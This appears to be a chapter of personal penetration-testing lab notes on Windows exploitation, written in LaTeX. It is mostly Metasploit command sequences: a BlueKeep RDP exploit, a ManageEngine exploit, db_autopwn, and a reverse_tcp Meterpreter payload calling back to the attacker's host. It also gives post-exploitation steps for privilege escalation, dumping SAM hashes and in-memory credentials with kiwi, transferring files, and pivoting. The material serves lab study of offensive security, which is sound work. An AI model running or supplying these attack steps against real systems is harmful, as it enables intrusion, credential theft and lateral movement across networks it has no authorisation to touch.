\chapter{Windows System Exploitation}
\label{ch:windows_exploitation}

Windows exploitation covers a range of attack techniques beyond SMB. This chapter
covers BlueKeep, credential-based attacks, and Metasploit exploitation workflows
for Windows targets.

% ─────────────────────────────────────────────────────────────────────────────
\section{BlueKeep --- CVE-2019-0708}
\label{sec:bluekeep}

BlueKeep is a critical pre-authentication remote code execution vulnerability in
Windows Remote Desktop Services (RDP on port 3389). An unauthenticated attacker
can send specially crafted packets to the RDP service and execute arbitrary code.

\textbf{Affected systems:}
\begin{itemize}
  \item Windows XP, Vista, 7
  \item Windows Server 2003, 2008, 2008 R2
  \item Not affected: Windows 8, 10, Server 2012 onwards
\end{itemize}

\begin{warnbox}[Kernel memory --- crash risk]
BlueKeep targets kernel-space memory. Running this exploit without the correct
target set will crash the system. Always set the target type before running.
\end{warnbox}

\begin{termbox}
# Check if target is vulnerable
nmap -sV -p 3389 --script rdp-vuln-ms12-020 target_ip

# Metasploit BlueKeep
search BlueKeep
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
show options
set RHOST target_ip
set target 2        # Must set target --- default crashes the system

# Post-exploitation
sysinfo
getuid
\end{termbox}

% ─────────────────────────────────────────────────────────────────────────────
\section{Metasploit Exploitation Workflow}
\label{sec:msf_exploit_workflow}

The standard Metasploit exploitation workflow I follow for any Windows target:

\begin{termbox}
# 1. Start environment
service postgresql start && msfconsole
workspace -a target_name
setg RHOST target_ip
setg RHOSTS target_ip

# 2. Scan and save
db_nmap -sS -sV -o target_ip

# 3. Find relevant exploits
search type:exploit name:service_name
# Or by CVE:
search cve:2017 name:smb

# 4. Use and configure
use exploit/path/to/exploit
show options
set payload windows/meterpreter/reverse_tcp
set RHOST target_ip
set LHOST my_vpn_ip
set LPORT 4444

# 5. Run
exploit
# Or: run

# 6. Verify access
sysinfo
getuid

# 7. Review all sessions
sessions
sessions -i session_number    # Switch to session
\end{termbox}

% ─────────────────────────────────────────────────────────────────────────────
\section{ManageEngine Exploitation}
\label{sec:manageengine}

ManageEngine is enterprise IT management software. Certain versions contain
vulnerabilities that allow unauthenticated remote code execution.

\begin{termbox}
# After Nessus identifies ManageEngine vulnerability
use exploit/windows/http/manageengine_connectionid_write
show options
set RHOST target_ip
run
sysinfo
\end{termbox}

% ─────────────────────────────────────────────────────────────────────────────
\section{Autopwn --- Automated Exploitation}
\label{sec:autopwn}

\tool{db\_autopwn} automatically matches open services and versions to known
exploits and attempts them. Useful for quick wins when time is limited.

\begin{termbox}
# One-time setup: download and install db_autopwn
cd ~/Downloads
sudo mv db_autopwn.rb /usr/share/metasploit-framework/plugins/

# Inside msfconsole
load db_autopwn
db_autopwn -p -t -PI 445    # Target port 445, run all matching exploits
\end{termbox}

\begin{notebox}
Autopwn is noisy and will trigger alerts in monitored environments. Use it in labs.
In real engagements, manual targeted exploitation is professional practice.
\end{notebox}

% ─────────────────────────────────────────────────────────────────────────────
\section{Post-Exploitation --- Meterpreter Essentials}
\label{sec:meterpreter_essentials}

Once a Meterpreter session is open, these are the commands I run immediately:

\begin{termbox}
# System information
sysinfo              # OS, hostname, architecture
getuid               # Current user context
getpid               # Current process ID

# Process management
ps                   # List all processes
pgrep lsass          # Find LSASS PID (for credential dumping)
migrate <PID>        # Migrate into another process (more stable)

# File system
ls                   # List current directory
cd /                 # Navigate to root
cat flag.txt         # Read a file
download file.txt    # Download file to attacker
upload shell.exe     # Upload file to target

# Privilege escalation
getsystem            # Attempt privilege escalation to SYSTEM
getuid               # Confirm current privileges

# Credentials
hashdump             # Dump SAM database hashes
load kiwi            # Load Mimikatz-equivalent module
creds_all            # Dump all credentials from memory

# Networking
ipconfig             # Network interfaces
arp                  # ARP table (useful for pivoting)
route                # Routing table

# Session management
background           # Background current session (Ctrl+Z)
sessions             # List all sessions
sessions -i N        # Resume session N
exit                 # Close session
\end{termbox}

\screenshot{assets/images/Screenshot_2025-08-24_at_1.31.05_PM.png}{Meterpreter session open with sysinfo and getuid confirming SYSTEM access}

% ─────────────────────────────────────────────────────────────────────────────
\section{Learning Output}

\begin{takebox}
\textbf{What I Learned}
\begin{itemize}
  \item Setting the target type in BlueKeep is non-negotiable. Wrong target =
        system crash. I learned this the hard way in the lab.
  \item Migrating to a stable process before running \ic{hashdump} or loading
        \ic{kiwi} prevents the session from dying mid-operation.
  \item \ic{getsystem} does not always work. If it fails, look for a local
        privilege escalation exploit that matches the OS version.
  \item Background sessions with Ctrl+Z. Do not close them --- you need them
        for lateral movement.
\end{itemize}

\textbf{Enumeration Mindset --- When You Have a Meterpreter Session}
\begin{enumerate}
  \item \ic{sysinfo} and \ic{getuid} --- confirm what you have
  \item \ic{ps} + \ic{migrate} --- move to a stable process
  \item \ic{getsystem} --- try privilege escalation
  \item \ic{hashdump} --- dump credentials if SYSTEM
  \item \ic{ipconfig} + \ic{arp} --- understand the network for pivoting
\end{enumerate}

\textbf{Common Mistakes}
\begin{itemize}
  \item Running BlueKeep without setting the target --- crashes the system
  \item Not migrating before loading kiwi --- session dies
  \item Closing sessions instead of backgrounding them --- losing access to
        a hard-won shell that took 20 minutes to get
\end{itemize}
\end{takebox}
